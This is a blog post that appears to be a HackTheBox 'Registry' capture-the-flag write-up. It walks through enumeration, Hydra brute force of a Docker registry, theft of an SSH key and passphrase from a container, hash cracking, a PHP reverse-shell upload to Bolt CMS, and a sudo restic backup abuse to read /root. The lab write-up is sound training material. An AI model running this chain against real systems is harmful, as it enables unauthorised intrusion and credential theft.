---
layout: post
title: "[HTB] Registry Writeup"
date: 2020-04-03
categories: jekyll update
---


![Registry](/asset/images/registry/card.png)

# Introduction
Hello and welcome to my writeup for registry, very well designed box, enjoyed every part of it.

# Service Enumeration
Checking available services with a classic nmap 

```bash
# Nmap 7.80 scan initiated Thu Nov 28 19:42:42 2019 as: nmap -sC -sV -oA box -Pn box
Nmap scan report for box (10.10.10.159)
Host is up (0.094s latency).
rDNS record for 10.10.10.159: Registery.htb
Not shown: 996 closed ports
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp    open     http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp   open     ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
13456/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 28 19:43:22 2019 -- 1 IP address (1 host up) scanned in 40.27 seconds
```

# Web Enumeration
Home have nginx default on port 80, but trying 443 we notice that `https://registry.htb` use SSL certificate that contains this host : `docker.registry.htb`



Appended it to `/etc/hosts`. 


Started a gobuster instance with a medium wordlist.

```bash
root@Zakali:~/ROOTED/Registry# gobuster dir -u http://registry.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://registry.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/28 02:21:25 Starting gobuster
===============================================================
/install (Status: 301)
/bolt (Status: 301)
Progress: 50404 / 220561 (22.85%)^C
```

1. `/bolt` contain default CMS page, nothing intresting pops up.
2. `/install` contain  what appears to be random data at first.

But if use wget to pull cleanly the file, we could notice its actually a sneaky **gzip**, but the server is serving the file as a text meme type.

```bash
root@Zakali:~/ROOTED/Registry# wget http://registry.htb/install 
--2020-04-03 02:34:46--  http://registry.htb/install
Resolving registry.htb (registry.htb)... 10.10.10.159
Connecting to registry.htb (registry.htb)|10.10.10.159|:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://registry.htb/install/ [following]
--2020-04-03 02:34:46--  http://registry.htb/install/
Reusing existing connection to registry.htb:80.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘install’

install                                             [ <=>                                                                                                  ]   1.03K  --.-KB/s    in 0s      

2020-04-03 02:34:46 (34.3 MB/s) - ‘install’ saved [1050]

root@Zakali:~/ROOTED/Registry# file install 
install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original 
size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was "", 
from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200
```

Extracting the gzip, we get both a certificate, and links to a docker documention about registry and certificates.

```bash
root@Zakali:~/ROOTED/Registry/Docs/a# tar xzvf install.gz 
gzip: stdin: unexpected end of file
ca.crt
readme.md
tar: Child returned status 1
tar: Error is not recoverable: exiting now
root@Zakali:~/ROOTED/Registry/Docs/a# ls
ca.crt  install.gz  readme.md
root@Zakali:~/ROOTED/Registry/Docs/a# 
root@Zakali:~/ROOTED/Registry/Docs/a# cat readme.md 
# Private Docker Registry

- https://docs.docker.com/registry/deploying/
- https://docs.docker.com/engine/security/certificates/
root@Zakali:~/ROOTED/Registry/Docs/a# cat ca.crt 
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
-----END CERTIFICATE-----
```

# Registry Enumeration
Here is my thought process, the box name is registry, and we get plenty of hints that its using docker, and knowing that a registry is like a place where we can stock docker images, so there is probably a registry service running on the host.

```bash
root@Zakali:~/ROOTED/Registry# docker login docker.registry.htb
Username: 
Error: Non-null Username Required
```
Attempting to connect to it triggers a authentication errors, hence it confirms the presence of that service and make you look for the creds, immediatly brute force is with hydra.

```bash
root@Zakali:~/Registry# hydra -L usernames -P /usr/share/wordlists/fasttrack.txt docker.registry.htb http-get /v2/_catalog
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-29 17:12:34
[DATA] max 16 tasks per 1 server, overall 16 tasks, 5328 login tries (l:24/p:222), ~333 tries per task
[DATA] attacking http-get://docker.registry.htb:80/v2/_catalog
[80][http-get] host: docker.registry.htb   login: admin   password: admin
[STATUS] 2200.00 tries/min, 2200 tries in 00:01h, 3128 to do in 00:02h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Great, we got creds, once again, its good to try default creds before of bruteforcing, should have done that, but that works too.

```bash
root@Zakali:~/ROOTED/Registry# docker login docker.registry.htb -u admin -p admin WARNING! Using --password via the CLI is insecure. Use --password-stdin.
INFO[0000] Error logging in to v2 endpoint, trying next endpoint: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority 
Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority
```

I managed to attempt again to login but we got a new error this time, a cert error!
That cert file will probably be used to log in, after more googling, got two intrestings links that help me use that cert and fix the error, two relvant manual pages:

1. [**Deploy a registry server**](https://docs.docker.com/registry/deploying/)
2. [**Use self-signed certificates**]( https://docs.docker.com/registry/insecure/)

Now we know the path of where to put it which is `/etc/docker/certs.d/docker.registry.htb` 

```bash
root@Zakali:~# cat /etc/docker/certs.d/docker.registry.htb/ca.crt 
-----BEGIN CERTIFICATE-----
MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
-----END CERTIFICATE-----
```

And we are finally loged in.

```bash
root@Zakali:~# docker login https://docker.registry.htb -u admin -p admin
WARNING! Using --password via the CLI is insecure. Use --password-stdin.
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
```

Let's see what this registry has to offer:

```bash
root@Zakali:~# docker search docker.registry.htb
NAME                               DESCRIPTION                          STARS               OFFICIAL            AUTOMATED
evandrix/htb-registry-bolt-image   docker.registry.htb:443/bolt-image   0                                       
```

# Docker Image Enumeration
Great there is an image! let's pull it.

```bash
root@Zakali:~# docker pull docker.registry.htb/bolt-image

```

We then run a bash instance inside the container.

```bash
root@Zakali:~# docker run -it docker.registry.htb/bolt-image  bash
root@e45cbfa3189a:/# 
```

Using classic privelage "escalation" techniques, we spot a juicy encrypted ssh private key, paired with a public one that leaks the user, on root's ssh folder.

```bash
root@e45cbfa3189a:/# head /root/.ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDQ0QB2PXyb2AUShspjygtkqjzXFuX0dbayPI/irOEYCAOtgQs+nb9Ij3vZZX
+LMPpNtWJaGF+ti/5gTjnhfjyNji7L/3Se6aIJAqMlFqkf+E5xKntRlM9dpqMMNRLgAYAKW5lj5OciQ7ZaXx7btoYLiQHlxXbj
8RwEirWuFqwbi2lznckAU9Ua1DSu6yKdqIIpkB2FvJVFakTS32FagJ+rGm9TIWeiOPaQvKhyXQ0jeBL4Sdi5PmhLtkdOEWVgYVSoWaOythA3J2c1UAhfl5dLGS0FuD4Dv46xyrI8H7gpAexa1yF3Kei4PTHBEIQxscejsfCEOVZwe4sngYKrU7o6sf0rWpOf7jHuEUMCZVQgQ55fvv10P6CA2qhPQ/bpKzp2pGXRb1Xdr6v+ObgQ4knkK1GKqOegOane0wyhD5RFQF/NeYBqt1UIM2KigDv9foENc7p9HhHGFoWJEzyOeWCm4QcSg9H2ZgfZRAhCoiEijHh19SdNh9wanydkaj9H7iTsvNDi8ON4sLRGjVBsfPLl+UjIIsHU+bG+pxHUzb65yHJ8iFX+DndJncdbQs6X9Ckii58ElBmkSUDSZpFsOV81vVk6qdGm+EBcpVO09YsC03nUj1VEHtQG8hOG/t
JqesB50I5Gbi7+V2qZit3ZZOvkhVF5l2N0U9asjSpIT5Bmow== bolt@registry.htb
root@e45cbfa3189a:/# head /root/.ssh/id_rsa
head /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w
KhUv4Gj22O1t3koy9z0J0LpVM8NLMgVZhTj1eAlJO72dKBNNv5D4qkIDANmZeAGv
7RwWef8FwE3jTzCDynKJbf93Gpy/hj/SDAe77PD8J/Yi01Ni6MKoxvKczL/gktFL
/mURh0vdBrIfF4psnYiOcIDCkM2EhcVCGXN6BSUxBud+AXF0QP96/8UN8A5+O115
p7eljdDr2Ie2LlF7dhHSSEMQG7lUqfEcTmsqSuj9lBwfN22OhFxByxPvkC6kbSyH
XnUqf+utie21kkQzU1lchtec8Q4BJIMnRfv1kufHJjPFJMuWFRbYAYlL7ODcpIvt
```

More Enumeration and we spot another script that contain the passphrase to private ssh key.

```bash
root@e45cbfa3189a:/etc# cat /etc/profile.d/01-ssh.sh 
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```


And boom we got user, one hell of a ride.
```bash
root@Zakali:~/ROOTED/Registry/User# ssh bolt@registry.htb -i id_rsa  
The authenticity of host 'registry.htb (10.10.10.159)' can't be established.
ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'registry.htb,10.10.10.159' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Fri Apr  3 02:48:45 UTC 2020

  System load:  0.0               Users logged in:                0
  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 31%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   1%                IP address for docker0:         172.17.0.1
  Processes:    155
Last login: Fri Apr  3 00:01:05 2020 from 10.10.14.180
bolt@bolt:~$ md5sum user.txt 
e4310f784ddfbd1a743f67bafaf78a98  user.txt
```

# Previlege Descalation
Was curious if the user  was running inside a container or on the box host, was able to confirm that we are not inside container with this [link](https://stackoverflow.com/questions/23513045/how-to-check-if-a-process-is-running-inside-docker-container).

```bash
#Prolly outside a docker container  
bolt@bolt:/tmp/aaa$ cat  /proc/1/cgroup
12:cpu,cpuacct:/
11:cpuset:/
10:memory:/
9:devices:/
8:hugetlb:/
7:rdma:/
6:blkio:/
5:pids:/
4:freezer:/
3:perf_event:/
2:net_cls,net_prio:/
1:name=systemd:/init.scope
0::/init.scope
```



With the user access, I run the default linux previlege escalation script [LinEnum](https://github.com/rebootuser/LinEnum), noticed the path for the CMS and started my enumeration there.
After some time, I noticed the db, and decided to run strings on it.

```bash
root@Zakali:~/ROOTED/Registry/User# scp -i id_rsa ~/Tools/public/LinEnum.sh bolt@registry.htb:/tmp 
Enter passphrase for key 'id_rsa': 
LinEnum.sh                                                                                                                                                  100%   45KB  14.2KB/s   00:03    
bolt@bolt:/var/www/html/bolt/app/database$ strings bolt.db   | grep admin
KK��2�/3%=3admin$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PKbolt@registry.htb2019-12-01 05:01:0210.10.14.225Admin["files://webshell.php"]["root","everyone"]
�� admin
��/ bolt@registry.htb
��
3admin$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PKbolt@registry.htb2019-12-01 05:01:0210.10.14.225Admin["files://webshell.php"]["root","everyone"]
 admin
```
We got the CMS admin hash, lets crack it with john and rockyou wordlist.

```bash 
root@Zakali:~/ROOTED/Registry/User/www-data# cat admin-hash 
admin:$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK

root@Zakali:~/Registry/User/www-data# john -w=/usr/share/wordlists/rockyou.txt admin-hash  
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
strawberry       (admin)
1g 0:00:00:07 DONE (2019-12-01 22:34) 0.1367g/s 48.01p/s 48.01c/s 48.01C/s strawberry..lorena
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```


Wierdly enough, I was not able to find the admin login page, so I decided to check out the nginx website deployement config.

```bash
bolt@bolt:/etc/nginx$ cat sites-enabled/01.registry.conf 
server {
    listen 80;
    listen [::]:80;
    listen 443 ssl;
    include snippets/self-signed.conf;
    include snippets/ssl-params.conf;

    root /var/www/html;
    index index.php index.html; 

    server_name registry.htb;

    location = /bolt/app/database/bolt.db {
        deny all;
        return 404;
    }

    location = /bolt/bolt {
        try_files               $uri $uri/ /bolt/index.php?$query_string;
    }

    location ^~ /bolt/bolt/ {
        try_files                     $uri /bolt/index.php?$query_string;
    }

    location ^~ /bolt/(.*)$ {
        try_files               $uri $uri/ /bolt/index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
    }

    location ~ /\.ht {
        deny all;
    }
}
```

Visiting `/bolt/bolt` instead of `bolt/login` and we are in the CMS login panel.

![Bolt Login](/asset/images/registry/LoginBolt.png)

Well, was a bit confused at first, since we have user, and the CMS is controlled by www-data which is a lower privelege than user in general, seemed to be backwards, nothing pointed me that focusing on the CMS will help get root, but the idea is to have as much controll on the machine as possible, and getting that shell is a way to increase control.
After attempting to upload a reverse shell php, I noticed that it does not allow that meme type, so I went to change the config to allow it.

![Allowing PHP upload](/asset/images/registry/PhpAccept.png)


After allowing php, uploading the php reverse shell, and triggering it by visiting it, we get www-data. (it had to be done fast, later noticed there is a cron cleaning to avoid spoilers for other players)


And we get a clean shell as `www-data`.

# Previlege Escalation (root)
Let's see what we can run :

```bash
www-data@bolt:~/html$ sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

AHA! we can escalate to root somehow using a curious program named `restic` that is used to do password protected backups, more info about it [**here**](https://restic.net/).

To be able to abuse this, I needed to master the usage of restic, and find a way to consider a usage that will allow me to escalate, rapid protyping on local and eating the documentation, made me realise that there is roughly 3 phases:

### Initiating a backup instance on a folder or a remote server

```bash
restic init -r instance
```

### Using that backup instance to store data
```bash
restic backup -r instance WHAT
```
### And finaly restore the backuped data

```bash
restic restore Snapshot_id -r instance  --target WHERE
```

The sudoed command is the backup one, so we are able to backup any file we want on the host as root, and be able to restore it as a regular user, potentially able to read the whole system.
To be able to change from one user to another when we do backups, its better to use a remote server as a backup instance instead of a folder.



# Exploitation

## Copy restic server to registry.htb

```bash
scp -i id_rsa /root/Registry/www-data/rest-server/bi/bin bolt@registry.htb:/tmp/.aa
```

## Start the server as user
```bash
bolt@bolt:/tmp/.aa$ ls
bin
bolt@bolt:/tmp/.aa$ chmod +x bin
bolt@bolt:/tmp/.aa$ ./bin --no-auth --path .
Data directory: .
Authentication disabled
Private repositories disabled
Starting server on :8000

```
## Init a repo as www-data on the remote server
```bash
www-data@bolt:~/html$ ls
backup.php  bolt  index.html  index.nginx-debian.html  install
www-data@bolt:~/html$ restic init -r rest:http://registry.htb:8000
enter password for new repository: 
enter password again: 
created restic repository 8feaba0e5e at rest:http://registry.htb:8000

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.

```

## Backup the whole root folder as www-data
```bash
www-data@bolt:~/html$ sudo restic backup -r rest:http://localhost:8000 /root
enter password for repository: 
password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root]
scanned 10 directories, 14 files in 0:00
[0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00 
duration: 0:00
snapshot 4b5b25b7 saved
```

## Restoring the backuped data as user

```bash
bolt@bolt:/tmp/.aa$ restic snapshots -r .
enter password for repository: 
password is correct
ID        Date                 Host        Tags        Directory
----------------------------------------------------------------------
4b5b25b7  2019-12-03 07:35:31  bolt                    /root
----------------------------------------------------------------------
1 snapshots
bolt@bolt:/tmp/.aa$ restic restore 4 -r . --target . 
enter password for repository: 
password is correct
restoring <Snapshot 4b5b25b7 of [/root] at 2019-12-03 07:35:31.243300115 +0000 UTC by root@bolt> to .
ignoring error for /root/.bash_history: Lchown: lchown /tmp/.aa/root/.bash_history: operation not permitted
ignoring error for /root/.bashrc: Lchown: lchown /tmp/.aa/root/.bashrc: operation not permitted
ignoring error for /root/.cache/motd.legal-displayed: Lchown: lchown /tmp/.aa/root/.cache/motd.legal-displayed: operation not permitted
ignoring error for /root/.cache: Lchown: lchown /tmp/.aa/root/.cache: operation not permitted
ignoring error for /root/.config/composer/keys.dev.pub: Lchown: lchown /tmp/.aa/root/.config/composer/keys.dev.pub: operation not permitted
ignoring error for /root/.config/composer/keys.tags.pub: Lchown: lchown /tmp/.aa/root/.config/composer/keys.tags.pub: operation not permitted
ignoring error for /root/.config/composer: Lchown: lchown /tmp/.aa/root/.config/composer: operation not permitted
ignoring error for /root/.config: Lchown: lchown /tmp/.aa/root/.config: operation not permitted
ignoring error for /root/.gnupg/private-keys-v1.d: Lchown: lchown /tmp/.aa/root/.gnupg/private-keys-v1.d: operation not permitted
ignoring error for /root/.gnupg: Lchown: lchown /tmp/.aa/root/.gnupg: operation not permitted
ignoring error for /root/.local/share/nano: Lchown: lchown /tmp/.aa/root/.local/share/nano: operation not permitted
ignoring error for /root/.local/share: Lchown: lchown /tmp/.aa/root/.local/share: operation not permitted
ignoring error for /root/.local: Lchown: lchown /tmp/.aa/root/.local: operation not permitted
ignoring error for /root/.profile: Lchown: lchown /tmp/.aa/root/.profile: operation not permitted
ignoring error for /root/.selected_editor: Lchown: lchown /tmp/.aa/root/.selected_editor: operation not permitted
ignoring error for /root/.ssh/authorized_keys: Lchown: lchown /tmp/.aa/root/.ssh/authorized_keys: operation not permitted
ignoring error for /root/.ssh/id_rsa: Lchown: lchown /tmp/.aa/root/.ssh/id_rsa: operation not permitted
ignoring error for /root/.ssh/id_rsa.pub: Lchown: lchown /tmp/.aa/root/.ssh/id_rsa.pub: operation not permitted
ignoring error for /root/.ssh: Lchown: lchown /tmp/.aa/root/.ssh: operation not permitted
ignoring error for /root/.wget-hsts: Lchown: lchown /tmp/.aa/root/.wget-hsts: operation not permitted
ignoring error for /root/config.yml: Lchown: lchown /tmp/.aa/root/config.yml: operation not permitted
ignoring error for /root/cron.sh: Lchown: lchown /tmp/.aa/root/cron.sh: operation not permitted
ignoring error for /root/root.txt: Lchown: lchown /tmp/.aa/root/root.txt: operation not permitted
ignoring error for /root: Lchown: lchown /tmp/.aa/root: operation not permitted
There were 24 errors
bolt@bolt:/tmp/.aa$ ls
bin  config  data  index  keys  locks  root  snapshots
bolt@bolt:/tmp/.aa$ cd root/
bolt@bolt:/tmp/.aa/root$ ls
config.yml  cron.sh  root.txt
bolt@bolt:/tmp/.aa/root$ cat root.txt 
ntrkz#########################gw
```

Boom, we got root flag.
It wasnt that easy when got to this point, someone had a script running that delete the root flag on each bloody reset, and spend 1 WHOLE DAY enumerating beyond the intended, oh man those were dark times, until I pinged someone on the forum and told me the flag was there as usual, proper sleep and we got the flag the next day.


Loved that box, was highly fun.
